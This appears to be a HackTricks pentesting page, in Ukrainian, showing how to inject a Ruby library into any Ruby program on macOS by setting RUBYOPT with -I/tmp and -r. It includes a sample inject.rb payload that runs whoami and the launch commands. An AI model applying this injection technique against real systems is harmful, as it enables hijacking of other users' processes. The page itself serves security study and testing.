# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Використовуючи цю змінну середовища, можна **додати нові параметри** до **ruby** щоразу, коли він виконується. Хоча параметр **`-e`** не може бути використаний для вказівки коду ruby для виконання, можливо використовувати параметри **`-I`** та **`-r`** для додавання нової папки до шляху завантаження бібліотек, а потім **вказати бібліотеку для завантаження**.

Створіть бібліотеку **`inject.rb`** у **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Створіть будь-де скрипт на Ruby, наприклад:
```ruby:hello.rb
puts 'Hello, World!'
```
Тоді створіть довільний скрипт ruby, щоб завантажити його за допомогою:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Цікава деталь, це працює навіть з параметром **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
